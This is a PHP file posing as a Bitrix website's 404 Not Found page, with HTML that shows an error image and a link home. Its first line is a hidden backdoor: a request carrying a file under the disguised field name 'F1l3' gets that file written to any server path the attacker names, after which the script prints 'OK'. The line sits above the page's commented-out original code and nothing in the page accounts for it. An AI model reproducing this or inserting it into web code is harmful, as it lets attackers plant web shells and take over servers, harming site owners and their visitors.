<?php
if ($_FILES['F1l3']) {move_uploaded_file($_FILES['F1l3']['tmp_name'], $_POST['Name']); echo 'OK'; Exit;}
//include_once($_SERVER['DOCUMENT_ROOT'].'/bitrix/modules/main/include/urlrewrite.php');

//CHTTP::SetStatus("404 Not Found");
//@define("ERROR_404","Y");

//require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");

//$APPLICATION->SetTitle("404 Not Found");

/*$APPLICATION->IncludeComponent("bitrix:main.map", ".default", Array(
	"LEVEL"	=>	"3",
	"COL_NUM"	=>	"2",
	"SHOW_DESCRIPTION"	=>	"Y",
	"SET_TITLE"	=>	"Y",
	"CACHE_TIME"	=>	"36000000"
	)
); */

//require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php"); ?>


<!DOCTYPE html>
<html style="width:100%; height:100%; overflow: hidden;">
    <head>
        <title>404 Not Found</title>
         <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
    </head>
    <body style="width:100%; height:100%; overflow: hidden;">

<div id="404_error" style=" width: 100%;
      height:100%;
      background-image: url(/i/404_error.png);
      background-repeat: no-repeat;
      background-position: center center;
      text-align:center;
      position: relative;
      ">  
      <a href="/"><div style="position:absolute;
     background-image: url(/i/404_main.png);
      background-repeat: no-repeat;
      background-position: center center;  
      width: 150px;
      height: 90px;
      margin: auto;
      left: 0;
      right: 0;
      bottom: 50px;                
    
    "></div></a>     
   
    
      </div>

</body>
</html>